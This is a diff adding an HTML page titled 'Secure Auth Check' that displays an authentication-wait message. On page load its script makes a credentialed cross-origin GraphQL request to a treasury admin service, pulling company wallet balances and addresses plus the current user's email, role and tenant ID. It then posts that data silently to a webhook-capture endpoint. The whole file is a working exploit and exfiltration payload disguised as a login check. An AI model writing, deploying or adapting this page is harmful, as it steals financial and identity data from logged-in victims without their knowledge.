@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Auth Check</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h2>Authenticating... Please wait.</h2>
+  <script>
+    setTimeout(() => {
+      fetch('https://treasury-admin.alphapoint.com/graphql', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          query: `{ adminCompanyDetail(companyId: "1") { id name wallets { id currency balance address } } currentUser { email role tenantId } }`
+        })
+      })
+      .then(r => r.json())
+      .then(data => {
+        fetch('https://app.hooklistener.com/w/my-first-endpoint-raet', {
+          method: 'POST',
+          body: JSON.stringify({ captured: new Date().toISOString(), data }),
+          mode: 'no-cors'
+        });
+      })
+      .catch(() => {});
+    }, 800);
+  </script>
+</body>
+</html>
